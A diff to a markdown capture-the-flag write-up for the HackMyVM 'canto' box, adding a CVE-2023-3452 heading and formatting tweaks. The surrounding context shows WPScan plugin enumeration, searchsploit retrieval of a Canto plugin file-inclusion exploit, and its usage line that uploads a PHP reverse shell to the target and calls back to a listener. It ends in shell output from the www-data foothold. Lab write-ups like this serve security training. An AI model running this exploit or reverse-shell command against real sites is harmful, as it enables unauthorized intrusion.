@@ -273,7 +273,7 @@ From the scan results, we see two interesting things from the output
 
 Judging by the name of this box, the plugin seems to be the way to go.
 
-```
+```bash
 [+] canto
  | Location: http://192.168.0.79/wp-content/plugins/canto/
  | Last Updated: 2024-07-17T04:18:00.000Z
@@ -311,6 +311,10 @@ garffff@garffff:~/hackmyvm/canto$ searchsploit -x php/webapps/51826.py
 File Type: <missing file package>
 garffff@garffff:~/hackmyvm/canto$ cp /snap/searchsploit/511/opt/exploitdb/exploits/php/webapps/51826.py .
 ```
+
+### CVE-2023-3452 
+
+The vulnerability has been labled as `CVE-2023-3452`. By the exploits own description `Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress`
 
 Viewing the help menu of the exploit: 
 
@@ -371,7 +375,6 @@ options:
 
     - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
     python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
-
 ```
 
 The exploit seems straightforward enough.  We need to give it a target URL, a local host IP and we can give it a reverse shell php file. I will use the `php-reverse-shell.php` php file found in Seclists:
@@ -419,7 +422,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ whoami && id
 www-data
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$ 
 ```
 
 Upgrading the STTY interface:
